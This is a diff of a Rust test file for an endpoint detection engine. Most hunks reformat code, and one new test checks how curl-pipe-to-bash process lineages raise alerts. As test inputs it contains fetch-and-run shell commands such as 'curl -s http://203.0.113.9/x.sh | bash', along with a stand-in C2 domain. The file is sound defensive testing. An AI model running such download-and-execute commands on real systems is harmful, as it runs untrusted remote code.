@@ -7,12 +7,20 @@
 
 use std::collections::BTreeMap;
 
-use detection::{confidence_policy, Confidence, DetectionEngine, DetectionSignals, EventClass, TelemetryEvent};
+use detection::{
+    confidence_policy, Confidence, DetectionEngine, DetectionSignals, EventClass, TelemetryEvent,
+};
 
 const BOOTSTRAP: &str = include_str!("../../agent-core/src/lifecycle/detection_bootstrap.rs");
 
 fn literals_between(start: &str, end: &str) -> Vec<String> {
-    let body = BOOTSTRAP.split_once(start).unwrap().1.split_once(end).unwrap().0;
+    let body = BOOTSTRAP
+        .split_once(start)
+        .unwrap()
+        .1
+        .split_once(end)
+        .unwrap()
+        .0;
     let mut out = Vec::new();
     for line in body.lines() {
         let line = line.trim();
@@ -29,19 +37,33 @@ fn literals_between(start: &str, end: &str) -> Vec<String> {
 }
 
 fn sigma_sources() -> Vec<&'static str> {
-    BOOTSTRAP.split("const SIGMA_").skip(1).map(|part| {
-        part.split_once("r#\"").unwrap().1.split_once("\"#;").unwrap().0
-    }).collect()
+    BOOTSTRAP
+        .split("const SIGMA_")
+        .skip(1)
+        .map(|part| {
+            part.split_once("r#\"")
+                .unwrap()
+                .1
+                .split_once("\"#;")
+                .unwrap()
+                .0
+        })
+        .collect()
 }
 
 fn production_like_engine() -> DetectionEngine {
     let mut d = DetectionEngine::default_with_rules();
-    d.layer1.load_hashes(literals_between("fn seed_ioc_hashes", "fn seed_string_signatures"));
+    d.layer1.load_hashes(literals_between(
+        "fn seed_ioc_hashes",
+        "fn seed_string_signatures",
+    ));
     let sigs = literals_between("load_string_signatures([", "]);");
     let feats = literals_between("load_string_features([", "]);");
     d.layer1.load_string_signatures(sigs);
     d.layer1.load_string_features(feats);
-    for source in sigma_sources() { d.load_sigma_rule_yaml(source).expect("built-in compiles"); }
+    for source in sigma_sources() {
+        d.load_sigma_rule_yaml(source).expect("built-in compiles");
+    }
     d
 }
 
@@ -49,7 +71,16 @@ fn production_like_engine() -> DetectionEngine {
 struct E(TelemetryEvent);
 
 #[allow(clippy::too_many_arguments)]
-fn ev(ts: i64, class: EventClass, pid: u32, ppid: u32, uid: u32, process: &str, parent: &str, session: u32) -> E {
+fn ev(
+    ts: i64,
+    class: EventClass,
+    pid: u32,
+    ppid: u32,
+    uid: u32,
+    process: &str,
+    parent: &str,
+    session: u32,
+) -> E {
     E(TelemetryEvent {
         ts_unix: ts,
         event_class: class,
@@ -137,10 +168,15 @@ fn run(events: &[E]) -> Outcome {
         o.kill_chain.extend(r.kill_chain_hits);
         o.named.extend(r.layer1.matched_signatures);
         o.prefilter |= r.layer1.prefilter_hit;
-        o.other.extend(r.exploit_indicators.iter().map(|s| format!("exploit:{s}")));
-        o.other.extend(r.tamper_indicators.iter().map(|s| format!("tamper:{s}")));
         o.other
-            .extend(r.kernel_integrity_indicators.iter().map(|s| format!("kernel:{s}")));
+            .extend(r.exploit_indicators.iter().map(|s| format!("exploit:{s}")));
+        o.other
+            .extend(r.tamper_indicators.iter().map(|s| format!("tamper:{s}")));
+        o.other.extend(
+            r.kernel_integrity_indicators
+                .iter()
+                .map(|s| format!("kernel:{s}")),
+        );
         if r.signals.z1_exact_ioc {
             o.other.push("z1_exact_ioc".into());
         }
@@ -390,12 +426,21 @@ fn scenarios() -> Vec<(&'static str, &'static str, &'static str, Vec<E>)> {
 fn ra2_a1_scenario_table() {
     let mut lines = Vec::new();
     let mut by_id = BTreeMap::new();
-    for (id, kind, desc, events) in scenarios().into_iter().filter(|(id, _, _, _)| !id.starts_with("W")) {
+    for (id, kind, desc, events) in scenarios()
+        .into_iter()
+        .filter(|(id, _, _, _)| !id.starts_with("W"))
+    {
         let o = run(&events);
         let temporal: Vec<String> = o
             .temporal
             .iter()
-            .map(|(k, v)| if *v > 1 { format!("{k}x{v}") } else { k.clone() })
+            .map(|(k, v)| {
+                if *v > 1 {
+                    format!("{k}x{v}")
+                } else {
+                    k.clone()
+                }
+            })
             .collect();
         let line = format!(
             "{id}\t{kind}\t{:?}\t{}\ttemporal=[{}]\tkillchain=[{}]\tl1_named=[{}]\tprefilter={}\tother=[{}]\t{desc}",
@@ -416,9 +461,13 @@ fn ra2_a1_scenario_table() {
     }
     println!("RA2-A1-TABLE-END");
 
-    let bad: Vec<_> = scenarios().into_iter().filter_map(|(id, kind, _, _)| {
-        (kind == "benign" && !id.starts_with("W") && by_id[id].max >= Confidence::High).then_some(id)
-    }).collect();
+    let bad: Vec<_> = scenarios()
+        .into_iter()
+        .filter_map(|(id, kind, _, _)| {
+            (kind == "benign" && !id.starts_with("W") && by_id[id].max >= Confidence::High)
+                .then_some(id)
+        })
+        .collect();
     assert!(bad.is_empty(), "benign HIGH cases: {bad:?}");
     for (id, minimum, expected_rule) in [
         ("LA02", Confidence::High, "phi_reverse_shell"),
@@ -435,12 +484,18 @@ fn ra2_a1_scenario_table() {
         ("LA13", Confidence::Medium, "phi_download_pipe_shell"),
     ] {
         assert!(by_id[id].max >= minimum, "{id}: attack below {minimum:?}");
-        assert!(by_id[id].temporal.contains_key(expected_rule), "{id}: missing {expected_rule}");
+        assert!(
+            by_id[id].temporal.contains_key(expected_rule),
+            "{id}: missing {expected_rule}"
+        );
     }
     assert!(by_id["LA07"].max >= Confidence::High);
     assert_eq!(by_id["IA02"].max, Confidence::Definite);
-    assert_eq!(by_id["IA01"].max, Confidence::None, "a deleted placeholder is not an attack");
-
+    assert_eq!(
+        by_id["IA01"].max,
+        Confidence::None,
+        "a deleted placeholder is not an attack"
+    );
 }
 
 #[test]
@@ -454,17 +509,26 @@ fn ra2_a1_policy_matrix() {
     };
     let mut s = base.clone();
     s.l1_prefilter_hit = true;
-    assert_eq!(check("l1_prefilter_only(named or feature)", s), Confidence::None);
+    assert_eq!(
+        check("l1_prefilter_only(named or feature)", s),
+        Confidence::None
+    );
     let mut s = base.clone();
     s.z2_temporal = true;
     assert_eq!(check("z2_temporal_only", s), Confidence::High);
     let mut s = base.clone();
     s.z2_temporal = true;
     s.l1_prefilter_hit = true;
-    assert_eq!(check("z2_temporal+l1_prefilter(feature)", s), Confidence::High);
+    assert_eq!(
+        check("z2_temporal+l1_prefilter(feature)", s),
+        Confidence::High
+    );
     let mut s = base.clone();
     s.network_ioc_hit = true;
-    assert_eq!(check("network_ioc_hit(prefilter only)", s), Confidence::High);
+    assert_eq!(
+        check("network_ioc_hit(prefilter only)", s),
+        Confidence::High
+    );
     let mut s = base.clone();
     s.z1_exact_ioc = true;
     assert_eq!(check("z1_exact_ioc", s), Confidence::Definite);
@@ -504,14 +568,22 @@ fn ra2_a1_l1_substring_collisions() {
     for c in cases {
         let e = ev(1, ProcessExec, 1, 1, 0, "sh", "bash", 1).cmd(c);
         let h = d.layer1.check_event(&e.0);
-        println!("{c}\tprefilter={}\tnamed={:?}", h.prefilter_hit, h.matched_signatures);
+        println!(
+            "{c}\tprefilter={}\tnamed={:?}",
+            h.prefilter_hit, h.matched_signatures
+        );
     }
     println!("RA2-A1-L1-END");
     // Real one-liners never contain the adjacent "curl|sh" seed strings.
-    let docker = d
-        .layer1
-        .check_event(&ev(1, ProcessExec, 1, 1, 0, "sh", "bash", 1).cmd("sh -c wget -qO- https://x/i.sh | bash").0);
-    assert!(!docker.matched_signatures.iter().any(|s| s.contains("wget|bash") || s.contains("wget | bash")));
+    let docker = d.layer1.check_event(
+        &ev(1, ProcessExec, 1, 1, 0, "sh", "bash", 1)
+            .cmd("sh -c wget -qO- https://x/i.sh | bash")
+            .0,
+    );
+    assert!(!docker
+        .matched_signatures
+        .iter()
+        .any(|s| s.contains("wget|bash") || s.contains("wget | bash")));
 }
 
 #[test]
@@ -519,14 +591,24 @@ fn ra2_a1_bundle_jsonl_ioc_lines_are_inert() {
     // build-bundle.yml: "domains/IPs are JSONL after merge"; layer1 parse_ioc_line
     // keeps the whole line, so the indicator can never match.
     let mut l1 = detection::IocLayer1::new();
-    let jsonl = "{\"value\":\"evil-c2.test\",\"confidence\":\"medium\",\"sources\":[\"urlhaus\"]}\n\
+    let jsonl =
+        "{\"value\":\"evil-c2.test\",\"confidence\":\"medium\",\"sources\":[\"urlhaus\"]}\n\
                  {\"value\":\"203.0.113.77\",\"confidence\":\"medium\",\"sources\":[\"feodo\"]}\n";
     let n = l1.load_domains_from_reader(std::io::Cursor::new(jsonl.as_bytes()));
     let m = l1.load_ips_from_reader(std::io::Cursor::new(jsonl.as_bytes()));
-    println!("RA2-A1-JSONL loaded_domains={n} loaded_ips={m} domain={:?} ip={:?}",
-        l1.check_domain("evil-c2.test"), l1.check_ip("203.0.113.77"));
-    assert_eq!(n, 2, "lines are counted as loaded (manifest count check passes)");
-    assert_eq!(l1.check_domain("evil-c2.test"), detection::Layer1Result::Clean);
+    println!(
+        "RA2-A1-JSONL loaded_domains={n} loaded_ips={m} domain={:?} ip={:?}",
+        l1.check_domain("evil-c2.test"),
+        l1.check_ip("203.0.113.77")
+    );
+    assert_eq!(
+        n, 2,
+        "lines are counted as loaded (manifest count check passes)"
+    );
+    assert_eq!(
+        l1.check_domain("evil-c2.test"),
+        detection::Layer1Result::Clean
+    );
     assert_eq!(l1.check_ip("203.0.113.77"), detection::Layer1Result::Clean);
     // Plain-line format works, including parent-suffix semantics.
     let mut plain = detection::IocLayer1::new();
@@ -540,11 +622,79 @@ fn ra2_a1_bundle_jsonl_ioc_lines_are_inert() {
 #[ignore = "RAFIX-INTEGRATION: needs APACKS sigma compiler"]
 fn rafix_windows_scenarios() {
     let mut bad = Vec::new();
-    for (id, kind, _, events) in scenarios().into_iter().filter(|(id, _, _, _)| id.starts_with("W")) {
+    for (id, kind, _, events) in scenarios()
+        .into_iter()
+        .filter(|(id, _, _, _)| id.starts_with("W"))
+    {
         let o = run(&events);
         println!("RAFIX-WINDOWS {id} {:?} {:?}", o.max, o.temporal);
-        let minimum = if matches!(id, "WA07" | "WA08") { Confidence::Medium } else { Confidence::High };
-        if (kind == "benign" && o.max >= Confidence::High) || (kind == "attack" && id != "WA08" && o.max < minimum) { bad.push(id); }
+        let minimum = if matches!(id, "WA07" | "WA08") {
+            Confidence::Medium
+        } else {
+            Confidence::High
+        };
+        if (kind == "benign" && o.max >= Confidence::High)
+            || (kind == "attack" && id != "WA08" && o.max < minimum)
+        {
+            bad.push(id);
+        }
     }
     assert!(bad.is_empty(), "windows mismatches: {bad:?}");
+}
+
+#[test]
+fn apacks_download_blocker_real_lineage_and_no_wrapper_duplicate() {
+    // Exact APACKS unrelated_download_case inputs (same session/PID-1 ancestor).
+    let mut engine = production_like_engine();
+    let download = ev(1, ProcessExec, 900, 1, 1000, "curl", "cron", 900)
+        .cmd("curl https://hc-ping.example/uuid")
+        .file("/usr/bin/curl", false);
+    let unrelated = ev(2, ProcessExec, 901, 1, 1000, "bash", "sshd", 900)
+        .cmd("/bin/bash /home/synthetic/deploy.sh")
+        .file("/usr/bin/bash", false);
+    for e in [download, unrelated] {
+        let outcome = engine.process_event(&e.0);
+        assert_eq!(outcome.confidence, Confidence::None);
+        assert_eq!(outcome.layer1.result, detection::Layer1Result::Clean);
+        assert!(!outcome.layer1.prefilter_hit);
+        assert!(outcome.layer1.matched_signatures.is_empty());
+        assert!(outcome.temporal_hits.is_empty());
+        assert!(outcome.kill_chain_hits.is_empty());
+    }
+    // Same APACKS pipe string/IP, with the children a real pipeline necessarily spawns.
+    let mut engine = production_like_engine();
+    let parent = ev(1, ProcessExec, 900, 1, 1000, "sh", "bash", 900)
+        .cmd("sh -c 'curl -s http://203.0.113.9/x.sh | bash'")
+        .file("/usr/bin/sh", false);
+    let parent_outcome = engine.process_event(&parent.0);
+    assert!(parent_outcome
+        .layer1
+        .matched_signatures
+        .iter()
+        .any(|s| s == "download_pipe_shell"));
+    assert_eq!(
+        parent_outcome.confidence,
+        Confidence::None,
+        "wrapper is context, not a second alert"
+    );
+    let mut alerts = Vec::new();
+    if parent_outcome.confidence != Confidence::None {
+        alerts.push(parent_outcome);
+    }
+    for e in [
+        ev(2, ProcessExec, 901, 900, 1000, "curl", "sh", 900)
+            .cmd("curl -s http://203.0.113.9/x.sh")
+            .file("/usr/bin/curl", false),
+        ev(3, ProcessExec, 902, 900, 1000, "bash", "sh", 900)
+            .cmd("bash")
+            .file("/usr/bin/bash", false),
+    ] {
+        let outcome = engine.process_event(&e.0);
+        if outcome.confidence != Confidence::None {
+            alerts.push(outcome);
+        }
+    }
+    assert_eq!(alerts.len(), 1, "one pipeline, one finding");
+    assert_eq!(alerts[0].confidence, Confidence::Medium);
+    assert_eq!(alerts[0].temporal_hits, vec!["phi_download_pipe_shell"]);
 }
